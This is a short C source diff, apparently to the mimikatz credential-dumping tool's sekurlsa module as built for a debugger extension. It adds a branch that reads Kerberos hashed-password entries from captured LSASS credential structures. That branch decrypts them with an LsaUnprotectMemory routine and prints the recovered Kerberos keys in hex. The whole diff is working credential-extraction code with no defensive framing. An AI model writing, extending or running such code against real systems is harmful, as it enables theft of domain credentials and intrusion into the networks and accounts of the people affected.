@@ -193,6 +193,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
 	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
 	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
+	PKERB_HASHPASSWORD_6 pHashPassword;
+	UNICODE_STRING buffer;
 	PVOID base;
 	DWORD type, i;
 
@@ -255,6 +257,23 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					LocalFree(mesCreds->UserName.Buffer);
 				}
 			}
+		}
+		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
+		{
+			pHashPassword = (PKERB_HASHPASSWORD_6) mesCreds;
+			dprintf("\n\t\t%s : ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
+			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
+			{
+				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
+				if(kull_m_string_getDbgUnicodeString(&buffer))
+				{
+					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer.Buffer, buffer.MaximumLength);
+					kull_m_string_dprintf_hex(buffer.Buffer, buffer.Length, 0);
+					LocalFree(buffer.Buffer);
+				}
+			}
+			else dprintf("<no size, buffer is incorrect>");
 		}
 		else
 		{
